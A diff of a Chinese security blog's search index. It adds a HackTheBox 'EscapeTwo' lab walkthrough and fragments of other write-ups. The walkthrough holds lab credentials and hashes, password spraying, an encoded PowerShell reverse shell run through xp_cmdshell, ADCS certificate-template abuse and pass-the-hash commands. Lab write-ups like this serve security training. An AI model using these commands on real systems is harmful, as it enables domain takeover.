+<h1 id="dev-prod-用户移动"><a href="#dev-prod-用户移动" class="headerlink" title="dev -&gt; prod 用户移动"></a>dev -&gt; prod 用户移动</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>对内网进行基础信息枚举</p>
 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ sudo -l</span><br><span class="line">[sudo] password for dev: </span><br><span class="line">Sorry, user dev may not run sudo on editorial.</span><br></pre></td></tr></table></figure></div>
 
 <p>列出SUID文件，但并没有可利用提权的文件</p>
@@ -811,7 +917,7 @@
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022115654170.png" class title="image-20241022115654170">
 
-<h3 id="Git-历史记录敏感信息收集："><a href="#Git-历史记录敏感信息收集：" class="headerlink" title="Git 历史记录敏感信息收集："></a>Git 历史记录敏感信息收集：</h3><p>dev 用户路径下存在一个 apps 目录</p>
+<h2 id="Git-历史记录敏感信息收集"><a href="#Git-历史记录敏感信息收集" class="headerlink" title="Git 历史记录敏感信息收集"></a>Git 历史记录敏感信息收集</h2><p>dev 用户路径下存在一个 apps 目录</p>
 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:/home$ cd ~</span><br><span class="line">dev@editorial:~$ ls -liah</span><br><span class="line">total 36K</span><br><span class="line">79764 drwxr-x--- 4 dev  dev  4.0K Oct 22 06:52 .</span><br><span class="line">76438 drwxr-xr-x 4 root root 4.0K Jun  5 14:36 ..</span><br><span class="line">79704 drwxrwxr-x 3 dev  dev  4.0K Jun  5 14:36 apps</span><br><span class="line">80303 lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -&gt; /dev/null</span><br><span class="line">80301 -rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout</span><br><span class="line">80256 -rw-r--r-- 1 dev  dev  3.7K Jan  6  2022 .bashrc</span><br><span class="line">79703 drwx------ 2 dev  dev  4.0K Jun  5 14:36 .cache</span><br><span class="line">  187 -rw------- 1 dev  dev    20 Oct 22 06:52 .lesshst</span><br><span class="line">80300 -rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile</span><br><span class="line">83829 -rw-r----- 1 root dev    33 Oct 22 04:06 user.txt</span><br></pre></td></tr></table></figure></div>
 
 <p>进入该目录，发现这是一个 <code>git</code> 项目文件夹，<code>.git</code> 目录仍然存在，说明这个项目之前使用了 Git 进行版本控制。然而，当运行 git status 时，Git 显示了项目中的文件都已被删除。</p>
@@ -834,7 +940,7 @@
 <p>使用账号密码切换 prod 用户</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022173023570.png" class title="image-20241022173023570">
 
-<h2 id="Root-权限提升："><a href="#Root-权限提升：" class="headerlink" title="Root 权限提升："></a>Root 权限提升：</h2><p>从 <code>Dev</code> 用户切换至 <code>Prod</code> 用户，并用 <code>sudo -l </code> 列出用户具有的 <code>sudo</code> 权限，发现具备使用 root 权限运行 <code>clone_prod_change.py</code> 文件的权限</p>
+<h1 id="Root-权限提升"><a href="#Root-权限提升" class="headerlink" title="Root 权限提升"></a>Root 权限提升</h1><p>从 <code>Dev</code> 用户切换至 <code>Prod</code> 用户，并用 <code>sudo -l </code> 列出用户具有的 <code>sudo</code> 权限，发现具备使用 root 权限运行 <code>clone_prod_change.py</code> 文件的权限</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">prod@editorial:~$ sudo -l</span><br><span class="line">[sudo] password for prod: </span><br><span class="line">Matching Defaults entries for prod on editorial:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User prod may run the following commands on editorial:</span><br><span class="line">    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</span><br></pre></td></tr></table></figure></div>
 
 <p>查看 <code>/opt/internal_apps/clone_changes/clone_prod_change.py</code> 文件，发现代码使用了 <code>gitpython</code> 库调用 <code>git</code></p>
@@ -882,9 +988,196 @@
       </tags>
   </entry>
   <entry>
+    <title>HackTheBox - EscapeTwo</title>
+    <url>/2025/03/05/HackTheBox-EscapeTwo/</url>
+    <content><![CDATA[<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221181200747.png" class title="image-20250221181200747">
+
+
+
+<p>分配IP：10.10.11.51</p>
+<p><strong>已有凭证</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rose/KxEPkKe6R8su</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="外网信息探测"><a href="#外网信息探测" class="headerlink" title="外网信息探测"></a>外网信息探测</h1><p>使用 rustscan 进行对目标全端口扫描</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustscan -a escapetwo.htb -r 1-65535 --ulimit 5000 | tee res</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220212000360.png" class title="image-20250220212000360">
+
+<p>将靶机TCP开放端口号提取并保存，交给 nmap 指定端口进行详细扫描</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ports=$(grep -oP &#x27;(?&lt;=:)\d+&#x27; res | grep -vE &#x27;^19$&#x27; | paste -sd,) &amp;&amp; echo $ports</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Nmap 服务版本探测</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -Pn -A -sV -p$ports sequel.htb</span><br></pre></td></tr></table></figure></div>
+
+<p>结果显示 AD域名：sequel.htb；对方还开放了几个重要端口：389、636等 LDAP服务，445 SMB服务，1433 MSSQL服务、5985 winrm服务等</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220215413987.png" class title="image-20250220215413987">
+
+<p>对目标 TCP 开放端口进行漏洞扫描</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -p$ports --script=vuln -O -Pn sequel.htb</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221095444635.png" class title="image-20250221095444635">
+
+<p>对目标常用 UDP 端口进行扫描</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221095542904.png" class title="image-20250221095542904">
+
+<p>对目标 UDP 开放端口进行脚本、服务扫描</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221100353637.png" class title="image-20250221100353637">
+
+<h2 id="SMB-共享服务测试"><a href="#SMB-共享服务测试" class="headerlink" title="SMB 共享服务测试"></a>SMB 共享服务测试</h2><p>已知目标445端口smb服务开放，且已有凭证中提供了一串账号密码，先对此进行测试</p>
+<p>直接尝试连接，登录成功</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -L \\10.10.11.51 -U rose</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250218160440000.png" class title="image-20250218160440000">
+
+<p>有许多共享文件夹，使用 smbmap 查看文件夹权限</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; -H sequel.htb</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220200151475.png" class title="image-20250220200151475">
+
+<p>递归 Accounting Department 目录， 在 Accouting Department 目录中发现表格文件</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; -H sequel.htb -r &#x27;Accounting Department&#x27;A</span><br></pre></td></tr></table></figure></div>
+
+ <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221101012418.png" class title="image-20250221101012418">
+
+<p>将文件下载至本地</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; -H sequel.htb -r &#x27;Accounting Department&#x27; --download &#x27;./Accounting Department/accounts.xlsx&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221101421135.png" class title="image-20250221101421135">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250218192424712.png" class title="image-20250218192424712">
+
+<p>accouts.xlsx 内部有用户凭据</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219105017703.png" class title="image-20250219105017703">
+
+<h1 id="边界突破"><a href="#边界突破" class="headerlink" title="边界突破"></a>边界突破</h1><h2 id="nxc-服务爆破"><a href="#nxc-服务爆破" class="headerlink" title="nxc 服务爆破"></a>nxc 服务爆破</h2><p>将收集到的账号密码整理，尝试爆破 winrm 远程登录，可惜都失败了</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc winrm sequel.htb -u user.txt -p pass.txt</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221102002249.png" class title="image-20250221102002249">
+
+<p>想到 sa 用户是 MSSQL 数据库的默认用户，尝试跑一下 MSSQL</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc mssql sequel.htb -u user.txt -p pass.txt --local-auth --continue-on-success</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220162537659.png" class title="image-20250220162537659">
+
+<p>使用成功的账号密码登录 MSSQL，成功连接，获得 miscrosft-server 数据库权限</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219152613878.png" class title="image-20250219152613878">
+
+<h2 id="xp-cmdshell-执行权限获取"><a href="#xp-cmdshell-执行权限获取" class="headerlink" title="xp_cmdshell 执行权限获取"></a>xp_cmdshell 执行权限获取</h2><p>当前数据库用户权限级高，xp_cmdshell 为关闭状态，因此配置开启</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219160254107.png" class title="image-20250219160254107">
+
+<p>拿到 xp_cmdshell 执行权限后，初步拿到主机用户权限了</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219162214365.png" class title="image-20250219162214365">
+
+<p>反弹 shell 一下</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219184700409.png" class title="image-20250219184700409">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAyACIALAA3ADcAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219184731271.png" class title="image-20250219184731271">
+
+<p>如果遇到 MSSQL 命令行不能输入太多字符的问题，使用 MSSQL 反弹脚本工具也可以</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(mighty㉿kali)-[~/tools/Script/MSSQL/mssql-command-tools]</span><br><span class="line">└─$ ./mssql-command-tools_Linux_amd64 --host 10.10.11.51 -u &quot;sa&quot; -p &#x27;MSSQLP@ssw0rd!&#x27; -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAyACIALAA3ADcAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="获取-ryan-用户登录凭证"><a href="#获取-ryan-用户登录凭证" class="headerlink" title="获取 ryan 用户登录凭证"></a>获取 ryan 用户登录凭证</h2><p>由于已知有一个数据库在运行，因此下一步是找配置文件，在根目录有清晰的数据库目录路径 <code>/SQL2019</code>。在翻阅配置文件时发现了有文本密码信息的配置文件 sql-Configuration.INI</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219195059146.png" class title="image-20250219195059146">
+
+<p>将所有已知的用户名都写入文件中，使用 crackmapexec 尝试爆破</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.51 -u user.txt  -p WqSZAF6CysDQbGb3</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219200417244.png" class title="image-20250219200417244">
+
+<p>爆破结果发现该密码是配对 ryan 用户的，使用 evil-winrm 远程登录，登录成功！</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i 10.10.11.51</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219200645450.png" class title="image-20250219200645450">
+
+<p>拿到第一个旗帜</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219202247547.png" class title="image-20250219202247547">
+
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="域环境分析"><a href="#域环境分析" class="headerlink" title="域环境分析"></a>域环境分析</h2><p>使用 netexec 获取 bloodhound 需要的域信息压缩文件</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc ldap sequel.htb -d sequel.htb -u &#x27;ryan&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; --dns-server 10.10.11.51 --bloodhound -c All</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221104131070.png" class title="image-20250221104131070">
+
+<p>导入至 Bloodhound</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221104037805.png" class title="image-20250221103836269">
+
+<p>如图标显示，ryan 对 ca_svc 具有 WriteOwner 权限，拥有修改它的对象所有者的权限</p>
+<h2 id="证书模板滥用"><a href="#证书模板滥用" class="headerlink" title="证书模板滥用"></a>证书模板滥用</h2><p>修改 ca_svc 用户所有者为 ryan</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD -d sequel.htb --dc-ip 10.10.11.51 --dns 10.10.11.51 -u &#x27;ryan&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; set owner ca_svc ryan</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221113932108.png" class title="image-20250221113932108">
+
+<p>再将 ryan 用户对 ca_svc 用户的权限提升至完全控制</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dacledit.py -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -principal &#x27;ryan&#x27; -target &#x27;ca_svc&#x27; &#x27;sequel.htb&#x27;/&#x27;ryan&#x27;:&#x27;WqSZAF6CysDQbGb3&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221113918110.png" class title="image-20250221113918110">
+
+<p>与目标 NTP 服务器同步系统时间，前面 UDP 扫描对方开启了 123 NTP服务</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ntpdate sequel.htb</span><br></pre></td></tr></table></figure></div>
+
+<p>创建ca_svc用户影子证书</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad shadow auto -u &#x27;ryan@sequel.htb&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; -account &#x27;ca_svc&#x27; -target sequel.htb -dc-ip 10.10.11.51 -ns 10.10.11.51</span><br></pre></td></tr></table></figure></div>
+
+<p>同时获取到了用户NTLM密码哈希：3b181b914e7a9d5508ea1e20bc2b7fce</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221152638237.png" class title="image-20250221152638237">
+
+<p>上传 Certify.exe </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload Certify.exe</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221160752219.png" class title="image-20250221160752219">
+
+<p>查看</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\Certify.exe find /domain:sequel.htb</span><br></pre></td></tr></table></figure></div>
+
+<p>关键部分，DunderMifflinAuthentication 这个模板能够被 Cert Publishers 组完全控制，且对 Domain Admins 具有注册权利。那么接下来我尝试寻找该模板漏洞，通过 certipy-ad 进行漏洞利用和模板重写来请求高权限证书</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221163706735.png" class title="image-20250221163706735">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -vulnerable -stdout</span><br></pre></td></tr></table></figure></div>
+
+<p>通过指定的用户名和哈希值在 Active Directory 中枚举与证书相关的漏洞信息。结果的确显示 DunderMifflinAuthentication 模板危险且具有 ESC4 漏洞</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221165240664.png" class title="image-20250221165240664">
+
+<p>重写该模板信息，使其符合攻击要求</p>
+<p>certipy-ad 和 ADCS 通过 自动更新模板权限，使得原本只能由 高权限用户（如 Domain Admins 或 Enterprise Admins） 使用的模板，可以被 低权限用户（如 ca_svc） 申请证书</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad template -u ca_svc@sequel.htb -hashes &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -k -template &#x27;DunderMifflinAuthentication&#x27; -target DC01.sequel.htb -ns 10.10.11.51 -debug</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221170200646.png" class title="image-20250221170200646">
+
+<p>请求一份Administrator用户符合模板要求的证书，此处需要在更新模板后第一时间执行才能得到</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad req -u ca_svc@sequel.htb -hashes &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -ca sequel-DC01-CA -template &#x27;DunderMifflinAuthentication&#x27; -upn Administrator@sequel.htb -target DC01.sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -dc-ip 10.10.11.51</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221172824755.png" class title="image-20250221172824755">
+
+<p>借助 pfx 证书通过身份认证</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad auth -pfx administrator_10.pfx</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221180641755.png" class title="image-20250221180641755">
+
+<h2 id="PTH-攻击"><a href="#PTH-攻击" class="headerlink" title="PTH 攻击"></a>PTH 攻击</h2><p>PTH，通过 NTLM 哈希实现对目标系统的身份验证</p>
+<p>通过上述哈希凭证登录靶机</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec sequel.htb/administrator@10.10.11.51 -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221180928423.png" class title="image-20250221180928423">
+
+<p>最后在 C:\Users\Administrator\Destop 目录中找到第二个旗帜</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221181045514.png" class title="image-20250221181045514">
+
+]]></content>
+      <categories>
+        <category>靶机系列</category>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>综合渗透靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java反序列化学习记录 - CC1 &amp;&amp; CC6</title>
     <url>/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/</url>
-    <content><![CDATA[<h2 id="URLDNS-链"><a href="#URLDNS-链" class="headerlink" title="URLDNS 链"></a>URLDNS 链</h2><p>URLDNS 是 Java 反序列化漏洞中的一种，利用了 Java 在反序列化过程中可以解析 URL，并且在请求期间利用 DNS 反向解析来泄露信息。</p>
+    <content><![CDATA[<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="URLDNS-链"><a href="#URLDNS-链" class="headerlink" title="URLDNS 链"></a>URLDNS 链</h2><p>URLDNS 是 Java 反序列化漏洞中的一种，利用了 Java 在反序列化过程中可以解析 URL，并且在请求期间利用 DNS 反向解析来泄露信息。</p>
 <p>URLDNS 核心是 java.net.URL 类</p>
 <p><strong>URLDNS 链示例</strong></p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250116214614913.png" class title="image-20250116214614913">
@@ -954,7 +1247,7 @@
 
 
 
-<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>CC6 链是 Commons Collections 反序列化漏洞 中影响范围最广的一条利用链，它仅受 Commons Collections 版本的影响，不受 Java 版本的限制。</p>
+<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><p>CC6 链是 Commons Collections 反序列化漏洞 中影响范围最广的一条利用链，它仅受 Commons Collections 版本的影响，不受 Java 版本的限制。</p>
 <p>受影响的 Commons Collections 范围：</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">commons-collections：3.1 - 3.2.1</span><br></pre></td></tr></table></figure></div>
 
@@ -962,7 +1255,7 @@
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250124155043383.png" class title="image-20250124155043383">
 
 <p>本次漏洞分析环境采用 commons-collections 3.2.1 版本</p>
-<h3 id="HashMap-版利用链"><a href="#HashMap-版利用链" class="headerlink" title="HashMap 版利用链"></a>HashMap 版利用链</h3><p>要实现反序列化命令执行，最基础的思路是通过 Runtime.exec() 触发计算器：</p>
